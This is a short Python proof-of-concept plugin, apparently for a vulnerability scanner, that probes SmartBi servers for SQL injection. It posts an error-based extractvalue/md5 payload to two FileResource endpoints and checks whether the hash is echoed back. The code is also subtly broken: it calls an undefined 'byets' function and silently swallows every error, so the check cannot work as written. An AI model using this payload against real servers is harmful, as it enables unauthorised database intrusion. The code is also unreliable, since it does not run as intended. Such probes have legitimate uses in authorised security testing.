#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'SmartBi 全版本 SQl 注入',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def substr(s,n,m):#返回字符串s的切片截取
  return s[n:m]
def hashmd5(s):
  import hashlib
  md5 = hashlib.md5()
  md5.update(str(s).encode('utf-8'))
  str_md5 = md5.hexdigest()
  return str_md5
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  num = randomLowercase(5)
  md5num = hashmd5(num)
  subst = substr(md5num,6,28)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = ['/vision/FileResource','/smartbi/vision/FileResource']
  data = f"op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{num}')))--+"
  url1 = url + target[0]
  url2 = url + target[1]
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and byets(subst) in res.text:
      ret['url'] = url1
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    resp = requests.post(url=url2,headers=headers,data=data,timeout=5,verify=False)
    if resp.status_code == 200 and byets(subst) in resp.text:
      ret['url'] = url2
      resp.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret